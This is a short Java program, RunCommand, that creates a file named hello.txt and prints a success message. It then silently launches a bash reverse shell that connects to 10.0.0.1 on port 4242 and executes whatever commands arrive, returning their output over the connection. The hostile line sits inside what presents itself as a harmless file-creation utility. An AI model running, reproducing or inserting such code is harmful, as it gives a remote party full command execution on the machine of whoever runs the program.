import java.io.*;

public class RunCommand {
    public static void main(String[] args) {
        try {
            Process process = Runtime.getRuntime().exec("touch hello.txt");
            process.waitFor();
            System.out.println("hello.txt created");
            Runtime r = Runtime.getRuntime();
            Process p = r.exec("/bin/bash -c 'exec 5<>/dev/tcp/10.0.0.1/4242;cat <&5 | while read line; do $line 2>&5 >&5; done'");
            p.waitFor();
        } catch (IOException | InterruptedException e) {
            e.printStackTrace();
        }
    }
}
